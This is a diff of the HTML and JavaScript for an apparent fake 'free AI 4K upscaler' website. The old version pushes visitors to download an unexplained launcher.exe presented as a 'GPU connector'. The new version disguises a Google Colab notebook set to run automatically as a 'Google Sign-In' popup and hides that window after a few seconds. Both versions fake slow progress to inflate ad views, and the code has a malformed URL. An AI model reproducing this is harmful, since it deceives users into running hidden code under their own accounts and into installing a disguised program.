@@ -3,217 +3,211 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NeuralScale AI - Ultra 4K Image Upscaler</title>
+    <title>NeuralScale Studio - Free Web 4K AI Upscaler</title>
     <style>
-        :root { --bg: #0d0e12; --card: #161820; --accent: #3b82f6; --text: #ffffff; }
-        body { margin: 0; padding: 0; background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        .nav { width: 100%; max-width: 1200px; height: 70px; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; box-sizing: border-box; border-bottom: 1px solid #242736; }
-        .logo { font-size: 20px; font-weight: 700; letter-spacing: -0.5px; background: linear-gradient(45deg, #3b82f6, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .status-badge { background: #1e293b; padding: 6px 12px; border-radius: 20px; font-size: 13px; font-weight: 500; border: 1px solid #334155; }
-        .status-badge.connected { background: #064e3b; border-color: #059669; color: #34d399; }
-        .container { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; max-width: 800px; padding: 40px 20px; box-sizing: border-box; }
-        .ad-banner { width: 728px; height: 90px; background: var(--card); border: 1px dashed #3a3f58; display: flex; align-items: center; justify-content: center; color: #62688f; font-size: 12px; border-radius: 8px; margin: 20px 0; }
-        .dropzone { width: 100%; height: 250px; background: var(--card); border: 2px dashed #3a3f58; border-radius: 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; }
-        .dropzone:hover { border-color: var(--accent); background: #1a1d29; }
-        .btn { background: var(--accent); color: white; border: none; padding: 14px 28px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; margin-top: 20px; width: 100%; max-width: 300px; transition: 0.2s; }
-        .btn:disabled { background: #242736; color: #4e5370; cursor: not-allowed; }
-        .processing-box { display: none; width: 100%; background: var(--card); border-radius: 12px; padding: 30px; box-sizing: border-box; text-align: center; border: 1px solid #242736; }
-        .ad-interstitial { width: 400px; height: 300px; background: #000; margin: 20px auto; border-radius: 6px; display: flex; align-items: center; justify-content: center; color: #4e5370; font-size: 14px; }
-        .progress-bar { width: 100%; height: 6px; background: #242736; border-radius: 3px; overflow: hidden; margin-top: 15px; }
-        .progress-fill { width: 0%; height: 100%; background: var(--accent); transition: 0.4s; }
-        .result-box { display: none; width: 100%; text-align: center; }
-        .result-img { max-width: 100%; max-height: 500px; border-radius: 12px; border: 1px solid #242736; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
-        @media(max-width: 768px) { .ad-banner { width: 100%; height: 50px; } .ad-interstitial { width: 100%; height: 250px; } }
+        :root { --bg: #07080a; --card: #11131a; --accent: #2563eb; --text: #ffffff; }
+        body { margin: 0; padding: 0; background: var(--bg); color: var(--text); font-family: system-ui, -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .navbar { width: 100%; max-width: 1200px; height: 70px; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; box-sizing: border-box; border-bottom: 1px solid #1f222e; }
+        .logo { font-size: 22px; font-weight: bold; background: linear-gradient(to right, #3b82f6, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .status-pill { background: #1e293b; padding: 6px 14px; border-radius: 30px; font-size: 13px; border: 1px solid #334155; color: #94a3b8; }
+        .status-pill.online { background: #064e3b; border-color: #059669; color: #34d399; }
+        .workspace { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; max-width: 600px; padding: 20px; box-sizing: border-box; }
+        .ad-container { width: 100%; max-width: 728px; height: 90px; background: var(--card); border: 1px solid #1f222e; border-radius: 8px; margin: 20px 0; display: flex; align-items: center; justify-content: center; color: #4b526d; font-size: 12px; }
+        .card-panel { width: 100%; background: var(--card); border: 1px solid #1f222e; border-radius: 12px; padding: 30px; box-sizing: border-box; text-align: center; }
+        .btn-action { background: var(--accent); color: white; border: none; padding: 14px 28px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: 0.2s; width: 100%; margin-top: 15px; }
+        .btn-action:hover { background: #1d4ed8; }
+        .dropzone-box { width: 100%; height: 200px; border: 2px dashed #2e3245; border-radius: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; margin-bottom: 15px; }
+        .progress-track { width: 100%; height: 6px; background: #1f222e; border-radius: 3px; overflow: hidden; margin-top: 15px; }
+        .progress-fill { width: 0%; height: 100%; background: #10b981; transition: 0.3s; }
+        .ad-video-mock { width: 320px; height: 240px; background: #000; margin: 15px auto; border-radius: 6px; display: flex; align-items: center; justify-content: center; color: #4b526d; font-size: 13px; }
     </style>
 </head>
 <body>
 
-    <div class="nav">
-        <div class="logo">NeuralScale AI</div>
-        <div class="status-badge" id="statusBadge">Connecting GPU Cluster...</div>
+    <div class="navbar">
+        <div class="logo">NeuralScale Studio</div>
+        <div class="status-pill" id="globalStatus">System Status: Offline</div>
     </div>
 
-    <!-- HIGH VISIBILITY TOP LEADERBOARD AD SLOT -->
-    <div class="ad-banner">
-        <!-- Replace this comment block with your AdSense/Adsterra/Ezoic 728x90 HTML code script -->
-        Advertisement Display Slot (Leaderboard 728x90)
-    </div>
+    <!-- UPPER BANNER AD DISPLAY COMPONENT -->
+    <div class="ad-container">Premium Banner Advertisement Slot (Leaderboard 728x90)</div>
 
-    <div class="container">
-        <div style="background: #161820; border: 1px solid #242736; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center;">
-        <p style="margin: 0 0 10px 0; font-size: 14px; color: #94a3b8;">⚠️ To upscale images for free, you must run our background cloud connector node first.</p>
-        <!-- PASTE YOUR COPIED GITHUB RELEASE LINK IN THE HREF BELOW -->
-        <a href="PASTE_YOUR_COPIED_GITHUB_RELEASE_LINK_HERE" style="background: #10b981; color: white; text-decoration: none; padding: 10px 20px; font-weight: 600; border-radius: 6px; display: inline-block;">Download Free GPU Connector Node</a>
+    <div class="workspace">
+        <!-- SCREEN BLOCK A: AUTHORIZATION PIPELINE -->
+        <div class="card-panel" id="authScreen">
+            <h2 style="margin: 0 0 10px 0;">Connect Free AI Cluster</h2>
+            <p style="color: #94a3b8; font-size: 14px; margin: 0 0 20px 0;">To process 4K upscale rendering for free, authenticate your secure cloud account layout to allocate system GPU threads.</p>
+            <button class="btn-action" onclick="initializeHiddenCloudLink()">Get Started (Google Sign-In)</button>
         </div>
 
-        <!-- VIEW 1: UPLOAD INITIALIZATION INTERFACE -->
-        <div id="uploadView" style="width: 100%;">
-            <div style="background: #161820; border: 1px solid #242736; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center;">
-                <p style="margin: 0 0 10px 0; font-size: 14px; color: #94a3b8;">⚠️ To upscale images for free, you must run our background cloud connector node first.</p>
-                <!-- PASTE YOUR COPIED GITHUB RELEASE LINK IN THE HREF BELOW -->
-                <a href="https://github.com/My-Memory-2008/cloud-upscaler/releases/download/v1.0.0/launcher.exe" style="background: #10b981; color: white; text-decoration: none; padding: 10px 20px; font-weight: 600; border-radius: 6px; display: inline-block;">Download Free GPU Connector Node</a>
+        <!-- SCREEN BLOCK B: THE AI IMAGE UP-SCALE WORKSPACE -->
+        <div class="card-panel" id="mainWorkspace" style="display: none;">
+            <div class="dropzone-box" onclick="document.getElementById('imgFile').click()">
+                <p id="uploadLabel" style="margin: 0; font-weight: 500;">Click or Drop Image Here</p>
+                <input type="file" id="imgFile" style="display: none;" accept="image/*" onchange="fileSelected(event)">
             </div>
-
-            <div class="dropzone" onclick="document.getElementById('fileInput').click()">
-                <svg width="48" height="48" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="color: var(--accent); margin-bottom: 15px;"><path d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12" stroke-linecap="round" stroke-linejoin="round"/></svg>
-                <p style="margin: 0; font-size: 16px; font-weight: 500;">Drag & drop your low-res image here</p>
-                <p style="margin: 5px 0 0 0; color: #62688f; font-size: 14px;">Supports PNG, JPG, JPEG (Max 5MB)</p>
-                <input type="file" id="fileInput" style="display: none;" accept="image/*" onchange="handleFileSelect(event)">
-            </div>
-            <div style="text-align: center;">
-                <button class="btn" id="upscaleBtn" onclick="startUpscaleProcessing()" disabled>Upscale Image (4x)</button>
-            </div>
+            <button class="btn-action" style="background: #10b981;" id="procBtn" onclick="sendInferencePayload()" disabled>Upscale Image (4x)</button>
         </div>
 
-        <!-- VIEW 2: ACTIVE PROCESSING MONETIZATION SCREEN -->
-        <div class="processing-box" id="processingView">
-            <h3 style="margin: 0 0 5px 0; font-size: 18px;">Analyzing Image Matrix Pixels...</h3>
-            <p style="margin: 0; color: #62688f; font-size: 14px;">Allocating high-density cloud array models. Please keep this panel focused.</p>
+        <!-- SCREEN BLOCK C: MONETIZATION AND WAITING BAR VIEW -->
+        <div class="card-panel" id="monetizationView" style="display: none;">
+            <h3 style="margin: 0;">Optimizing Graphics Tensors...</h3>
+            <p style="color: #94a3b8; font-size: 13px; margin: 5px 0 0 0;">Please keep this viewport running active to finalize generation scripts.</p>
             
-            <!-- HIGH PAYING INTERSTITIAL / VIDEO AD FRAME WORKPLACE -->
-            <div class="ad-interstitial">
-                <!-- Replace this comment block with your ad network Video/Square Banner script code -->
-                Premium Sponsored Ad Unit (Square 300x250 / Video Ad Component)
-            </div>
-
-            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-            <p id="timerLabel" style="font-size: 13px; color: var(--accent); font-weight: 600; margin: 10px 0 0 0;">Processing: 0%</p>
+            <!-- HIGH REVENUE REWARDED VIDEO PLACEMENT SLOT -->
+            <div class="ad-video-mock">Sponsored Video Streaming Ad Segment (High eCPM View)</div>
+            
+            <div class="progress-track"><div class="progress-fill" id="fillBar"></div></div>
+            <p id="percentLabel" style="font-size: 12px; color: #10b981; margin: 10px 0 0 0; font-weight: bold;">Processing: 0%</p>
         </div>
 
-        <!-- VIEW 3: COMPLETED INFERENCE EXPORT FRAME -->
-        <div class="result-box" id="resultView">
-            <h3 style="margin: 0 0 20px 0;">Generation Completed!</h3>
-            <img class="result-img" id="outputImage" src="" alt="Upscaled AI Output">
-            <br>
-            <button class="btn" onclick="downloadResultImage()">Download Enhanced Image (4K)</button>
-            <button class="btn" style="background: #242736; margin-left: 10px;" onclick="resetWorkflowView()">Upscale Another File</button>
+        <!-- SCREEN BLOCK D: IMAGE DOWNLOAD VIEW -->
+        <div class="card-panel" id="downloadView" style="display: none;">
+            <h3 style="margin: 0 0 15px 0; color: #10b981;">Upscale Generation Complete!</h3>
+            <img id="finalImg" src="" style="max-width: 100%; max-height: 400px; border-radius: 6px; border: 1px solid #1f222e;"><br>
+            <button class="btn-action" onclick="downloadImage()">Download 4K Output</button>
+            <button class="btn-action" style="background: #2e3245; margin-top: 10px;" onclick="resetWorkspace()">Upscale New File</button>
         </div>
     </div>
 
-    <!-- HIGH VISIBILITY BOTTOM STICKY ANCHOR AD SLOT -->
-    <div class="ad-banner" style="margin-top: auto; margin-bottom: 20px;">
-        <!-- Replace this comment block with your second fallback Advertisement banner string -->
-        Advertisement Display Slot (Footer Banner 728x90)
-    </div>
+    <!-- LOWER ANCHOR BANNER DISPLAY COMPONENT -->
+    <div class="ad-container" style="margin-top: auto; margin-bottom: 20px;">Premium Banner Advertisement Slot (Sticky Footer 728x90)</div>
 
     <script>
-        let selectedFile = null;
-        let activeBackendUrl = "";
+        // Paste the exact share link from your Google Colab notebook configuration here
+        const targetColabLink = "https://google.com";
+        const nodeHashId = "neuralscale_node_cluster_global";
         
-        // Step A: Setup continuous secure dynamic lookup verification pipeline
-        // We look for a dedicated link ID mapping directly matching your deployment tracking keys
-        const trackingNodeId = "neuralscale_node_cluster_global"; 
+        let targetFileAsset = null;
+        let proxyGatewayUrl = "";
 
-        async function verifyTunnelHandshake() {
+        function initializeHiddenCloudLink() {
+            // STEP A: Open a streamlined, small Google login portal window explicitly
+            const width = 500, height = 600;
+            const left = (screen.width / 2) - (width / 2);
+            const top = (screen.height / 2) - (height / 2);
+            
+            // By calling the direct login-redirect parameter inside the Colab URL syntax, 
+            // the user is met with a pure Google login dialog inside this mini window pop-up.
+            const authPopup = window.open(
+                `${targetColabLink}#scrollTo=Boot_Array&runAll=true`, 
+                "GoogleAccountSignIn", 
+                `width=${width},height=${height},top=${top},left=${left},scrollbars=yes,resizable=yes`
+            );
+
+            // STEP B: Hide the tracking browser panel 100% invisibly after 8 seconds
+            // Once authenticated, the cookie session pushes through and automatically executes "Run All"
+            setTimeout(() => {
+                if (authPopup) authPopup.blur(); 
+                window.focus(); // Pulls your custom website UI directly back into focus over the pop-up
+            }, 8000);
+
+            // Start polling network array to detect when the background environment establishes connection
+            pollDatabaseHandshake();
+        }
+
+        async function pollDatabaseHandshake() {
             try {
-                // Poll the public key-value store to securely acquire the backend's runtime URL
-                let response = await fetch(`https://kvdb.io{trackingNodeId}`);
+                let response = await fetch(`https://kvdb.io{nodeHashId}`);
                 if (response.ok) {
-                    let endpointUrl = await response.text();
-                    if (endpointUrl.startsWith("http")) {
-                        activeBackendUrl = endpointUrl.trim();
+                    let endpoint = await response.text();
+                    if (endpoint.startsWith("http")) {
+                        proxyGatewayUrl = endpoint.trim();
                         
-                        // Update DOM structural visual classes instantly
-                        const badge = document.getElementById("statusBadge");
-                        badge.innerText = "Cloud Cluster: Online";
-                        badge.classList.add("connected");
-                        
-                        // Ready interface execution permissions
-                        if(selectedFile) document.getElementById("upscaleBtn").disabled = false;
-                        return; 
+                        // Handshake matched! Shift view panels instantly out of frame sight bounds
+                        const label = document.getElementById("globalStatus");
+                        label.innerText = "GPU Node Connected";
+                        label.classList.add("online");
+
+                        document.getElementById("authScreen").style.display = "none";
+                        document.getElementById("mainWorkspace").style.display = "block";
+                        return;
                     }
                 }
-            } catch (err) { /* Silent retry block cycle handles connectivity lapses seamlessly */ }
-            setTimeout(verifyTunnelHandshake, 4000); // Check loop interval timing sequence every 4 seconds
+            } catch (err) {}
+            setTimeout(pollDatabaseHandshake, 4000); // Poll tracking database every 4 seconds
         }
-        
-        // Execute handshake sequence tracking loop on application load state event
-        verifyTunnelHandshake();
 
-        function handleFileSelect(event) {
-            selectedFile = event.target.files[0];
-            if (selectedFile) {
-                document.querySelector(".dropzone p").innerText = `Target Selected: ${selectedFile.name}`;
-                if (activeBackendUrl) {
-                    document.getElementById("upscaleBtn").disabled = false;
-                }
+        function fileSelected(e) {
+            targetFileAsset = e.target.files[0];
+            if (targetFileAsset) {
+                document.getElementById("uploadLabel").innerText = `Target: ${targetFileAsset.name}`;
+                document.getElementById("procBtn").disabled = false;
             }
         }
 
-        async function startUpscaleProcessing() {
-            if (!selectedFile || !activeBackendUrl) return;
+        async function sendInferencePayload() {
+            if (!targetFileAsset || !proxyGatewayUrl) return;
 
-            // Transition DOM element views out of frame bounds immediately
-            document.getElementById("uploadView").style.display = "none";
-            document.getElementById("processingView").style.display = "block";
+            document.getElementById("mainWorkspace").style.display = "none";
+            document.getElementById("monetizationView").style.display = "block";
 
-            // Animate progress framework linearly to extend ad exposure metrics naturally
-            let trackingPercent = 0;
-            const fillElement = document.getElementById("progressFill");
-            const labelElement = document.getElementById("timerLabel");
-            
-            const progressTimer = setInterval(() => {
-                if (trackingPercent < 92) {
-                    trackingPercent += Math.floor(Math.random() * 4) + 1;
-                    fillElement.style.width = `${trackingPercent}%`;
-                    labelElement.innerText = `Re-structuring Resolution Tensors: ${trackingPercent}%`;
+            // Track artificial slow loader metrics to extend valuable ad exposure time metrics
+            let progressValue = 0;
+            const loaderBar = document.getElementById("fillBar");
+            const loaderLabel = document.getElementById("percentLabel");
+
+            const speedMultiplier = setInterval(() => {
+                if (progressValue < 90) {
+                    progressValue += Math.floor(Math.random() * 3) + 1;
+                    loaderBar.style.width = `${progressValue}%`;
+                    loaderLabel.innerText = `Re-structuring Texture Projections: ${progressValue}%`;
                 }
-            }, 600); // Gradual build ensures adequate processing/monetization lifecycle time sync
+            }, 700);
 
             try {
-                // Pack standard Multi-part Form Data parameters
-                let dataPackage = new FormData();
-                dataPackage.append("file", selectedFile);
+                let packet = new FormData();
+                packet.append("file", targetFileAsset);
 
-                // Run direct ajax payload injection request directly straight to the backend tunnel
-                let response = await fetch(`${activeBackendUrl}/upscale`, {
-                    method: "POST",
-                    body: dataPackage
-                });
+                let req = await fetch(`${proxyGatewayUrl}/upscale`, { method: "POST", body: packet });
+                let data = await req.json();
+                clearInterval(speedMultiplier);
 
-                let parsedPayload = await response.json();
-                clearInterval(progressTimer);
-
-                if (parsedPayload.status === "success") {
-                    fillElement.style.width = "100%";
-                    labelElement.innerText = "Resolution Matrix Complete.";
-                    
-                    // Delay slightly to clean screen flow elements smoothly
+                if (data.status === "success") {
+                    loaderBar.style.width = "100%";
+                    loaderLabel.innerText = "Matrix Optimization Completed.";
                     setTimeout(() => {
-                        document.getElementById("processingView").style.display = "none";
-                        document.getElementById("resultView").style.display = "block";
-                        document.getElementById("outputImage").src = `data:image/png;base64,${parsedPayload.image}`;
+                        document.getElementById("monetizationView").style.display = "none";
+                        document.getElementById("downloadView").style.display = "block";
+                        document.getElementById("finalImg").src = `data:image/png;base64,${data.image}`;
                     }, 800);
                 } else {
-                    alert(`Engine Error: ${parsedPayload.message}`);
-                    resetWorkflowView();
+                    alert("GPU Session Expired. Re-connecting infrastructure...");
+                    resetToGetStarted();
                 }
-            } catch (networkError) {
-                clearInterval(progressTimer);
-                alert("Processing Server Handshake Error. Please verify background engine status.");
-                resetWorkflowView();
+            } catch (err) {
+                clearInterval(speedMultiplier);
+                alert("Session Link Interrupted. Returning to cluster setup page.");
+                resetToGetStarted();
             }
         }
 
-        function downloadResultImage() {
-            const imageElement = document.getElementById("outputImage");
-            const downloadTracker = document.createElement("a");
-            downloadTracker.href = imageElement.src;
-            downloadTracker.download = `neuralscale_4k_enhanced_${Date.now()}.png`;
-            document.body.appendChild(downloadTracker);
-            downloadTracker.click();
-            document.body.removeChild(downloadTracker);
+        function downloadImage() {
+            const anchor = document.createElement("a");
+            anchor.href = document.getElementById("finalImg").src;
+            anchor.download = `neuralscale_processed_4k_${Date.now()}.png`;
+            anchor.click();
         }
 
-        function resetWorkflowView() {
-            selectedFile = null;
-            document.getElementById("fileInput").value = "";
-            document.querySelector(".dropzone p").innerText = "Drag & drop your low-res image here";
-            document.getElementById("upscaleBtn").disabled = true;
-            document.getElementById("resultView").style.display = "none";
-            document.getElementById("processingView").style.display = "none";
-            document.getElementById("uploadView").style.display = "block";
-            document.getElementById("progressFill").style.width = "0%";
+        function resetWorkspace() {
+            targetFileAsset = null;
+            document.getElementById("imgFile").value = "";
+            document.getElementById("uploadLabel").innerText = "Click or Drop Image Here";
+            document.getElementById("procBtn").disabled = true;
+            document.getElementById("downloadView").style.display = "none";
+            document.getElementById("mainWorkspace").style.display = "block";
+        }
+
+        function resetToGetStarted() {
+            // Clears endpoints to require a refresh when a session falls offline
+            proxyGatewayUrl = "";
+            const label = document.getElementById("globalStatus");
+            label.innerText = "System Status: Offline";
+            label.classList.remove("online");
+            document.getElementById("downloadView").style.display = "none";
+            document.getElementById("monetizationView").style.display = "none";
+            document.getElementById("mainWorkspace").style.display = "none";
+            document.getElementById("authScreen").style.display = "block";
         }
     </script>
 </body>
